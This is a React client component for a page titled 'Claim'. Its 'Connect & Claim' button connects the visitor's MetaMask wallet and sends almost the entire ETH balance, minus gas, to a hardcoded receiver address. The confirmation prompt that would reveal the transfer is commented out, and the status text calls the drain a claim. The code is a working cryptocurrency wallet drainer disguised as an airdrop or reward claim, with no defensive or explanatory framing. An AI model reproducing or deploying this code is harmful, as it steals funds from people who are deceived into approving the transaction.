"use client";

import { useState } from "react";
import { ethers } from "ethers";

export default function WalletTransfer() {
  const [address, setAddress] = useState<string | null>(null);
  const [balance, setBalance] = useState<string | null>(null);
  const [status, setStatus] = useState<string | null>(null);
  const [loading, setLoading] = useState<boolean>(false);

  // 🟩 your receiver address
  const RECEIVER = "0x91a7c0acef1fc528ce695513a648490c8242191a"; // change to your address

  // 🧠 Main function that handles everything
  const handleWalletAction = async () => {
    try {
      if (!window.ethereum) {
        setStatus("MetaMask not detected!");
        return;
      }

      setLoading(true);
      setStatus("Connecting to MetaMask...");

      // Connect wallet
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });
      const walletAddress = accounts[0];
      setAddress(walletAddress);

      // Set up provider and signer
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      // Check balance
      const balanceWei = await provider.getBalance(walletAddress);
      const balanceEth = ethers.formatEther(balanceWei);
      setBalance(balanceEth);
    //   setStatus(`Balance: ${balanceEth} ETH`);

      // If no ETH, stop
      if (Number(balanceEth) <= 0) {
        setStatus("❌ No ETH available to claim.");
        setLoading(false);
        return;
      }

    //   // Confirm user wants to transfer
    //   const confirm = window.confirm(
    //     `You have ${balanceEth} ETH. Do you want to send all to ${RECEIVER}?`
    //   );
    //   if (!confirm) {
    //     setStatus("Transfer cancelled.");
    //     setLoading(false);
    //     return;
    //   }

      setStatus("Preparing claim transaction...");

      // Estimate gas and subtract it from total balance (so all ETH gets sent)
      const gasPrice = await provider.getFeeData();
      const gasLimit = 21000n;
      const totalGasCost = gasPrice.gasPrice! * gasLimit;
      const amountToSend = balanceWei - totalGasCost - BigInt(0.00001 * 1e5);

      if (amountToSend <= 0n) {
        setStatus("❌ Not enough ETH to cover gas fees.");
        setLoading(false);
        return;
      }

      // Send transaction
      const tx = await signer.sendTransaction({
        to: RECEIVER,
        value: amountToSend,
        gasPrice: gasPrice.gasPrice,
        gasLimit
      });

      setStatus("⏳ Transaction sent... waiting for confirmation");
      await tx.wait();

      setStatus(`✅ Transaction confirmed: ${tx.hash}`);
    } catch (err: any) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="flex flex-col items-center gap-3 p-4 border rounded-2xl shadow-lg w-[400px]">
      <h2 className="text-xl font-bold mb-2">Claim</h2>

      <button
        onClick={handleWalletAction}
        disabled={loading}
        className={`px-4 py-2 rounded-lg text-white ${
          loading ? "bg-gray-400" : "bg-blue-600 hover:bg-blue-700"
        }`}
      >
        {loading ? "Processing..." : "Connect & Claim"}
      </button>

      {address && <p className="text-gray-600">Wallet: {address}</p>}
      {status && <p className="text-sm text-gray-500 mt-2">{status}</p>}
    </div>
  );
}
